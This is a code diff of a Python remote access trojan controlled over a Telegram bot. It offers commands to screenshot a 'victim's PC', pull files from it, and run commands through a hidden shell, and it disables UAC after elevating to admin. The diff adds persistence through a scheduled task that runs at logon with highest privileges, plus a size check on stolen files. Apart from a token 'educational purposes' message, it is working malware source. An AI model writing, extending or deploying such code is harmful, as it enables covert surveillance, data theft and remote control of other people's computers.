@@ -10,7 +10,9 @@ import threading
 import time
 import signal
 import atexit
+import win32con
 import pyperclip
+import win32security
 import psutil
 import subprocess
 import requests
@@ -110,7 +112,6 @@ except Exception as e:
     log_message(f"Error initializing bot: {e}", 'error')
     bot = None
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
 def send_message(message):
     if bot:
         bot.send_message(chat_id, message)
@@ -121,7 +122,6 @@ def start_message():
     send_message("Use this script only for educational purposes!")
     send_message("To list all commands, type /help in the chatbox.")
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
 @bot.message_handler(commands=['help'])
 def send_help(message):
     help_message = (
@@ -129,14 +129,11 @@ def send_help(message):
         "/help - List available commands\n"
         "/screenshot - Capture and send a screenshot\n"
         "/upload - Upload file from victim's PC\n"
-        "/download - Download file from victim's PC\n"
-        "/shutdown - Execute shutdown to the victim's PC\n"
-        "/restart - Execute restart to the victim's PC\n"
+        "/download <filename> - Download file from victim's PC\n"
         "/shell <command> - Execute commands using a hidden shell"
     )
     bot.send_message(message.chat.id, help_message)
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
 @bot.message_handler(commands=['screenshot'])
 def send_photo(message):
     if bot:
@@ -154,7 +151,6 @@ def send_photo(message):
         except Exception as e:
             log_message(f"Error in send_photo: {e}", 'error')
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
 @bot.message_handler(commands=['download'])
 def download_command(message):
     global current_directory
@@ -166,13 +162,17 @@ def download_command(message):
         bot.send_message(message.chat.id, "File not found in the current directory.")
         return
 
+    file_size = os.path.getsize(file_path)
+    if file_size > 2 * 1024 * 1024 * 1024:
+        bot.send_message(message.chat.id, "File is too large to send (exceeds 2 GB limit).")
+        return
+
     try:
         with open(file_path, 'rb') as file:
-            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.")
+            bot.send_document(message.chat.id, file, caption=f"File '{filename}' downloaded successfully.", timeout=120)
     except Exception as e:
         bot.send_message(message.chat.id, f"Download failed: {e}")
 
-@retry_on_exception(requests.RequestException, retries=5, delay=2)
 @bot.message_handler(commands=['shell'])
 def shell_command(message):
     global current_directory
@@ -338,6 +338,30 @@ def disable_uac():
 
     winreg.CloseKey(reg_key)
 
+def task_exists(task_name):
+    try:
+        result = subprocess.run(f"schtasks /query /tn \"{task_name}\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return result.returncode == 0
+    except Exception as e:
+        print(f"Error checking task existence: {e}")
+        return False
+
+def add_to_startup():
+    try:
+        app_path = sys.executable
+        task_name = os.path.basename(app_path)
+
+        if task_exists(task_name):
+            print(f"The task '{task_name}' already exists. No need to add it again.")
+            return
+        
+        task_command = f"schtasks /create /tn \"{task_name}\" /tr \"'{app_path}'\" /sc onlogon /rl highest /f"
+        subprocess.run(task_command, shell=True, check=True)
+        
+        print(f"{task_name} added to startup as a scheduled task.")
+    except Exception as e:
+        print(f"Failed to add {task_name} to startup as a scheduled task: {e}")
+
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 #                                        [GUI Layout Functions]                                           #
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
@@ -416,8 +440,11 @@ if __name__ == '__main__':
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
             while not run_as_admin():
                 time.sleep(0.1)
+
         time.sleep(2)
         disable_uac()
+        time.sleep(2)
+        add_to_startup()
 
         session_files = create_session_files()
         sentence = ''
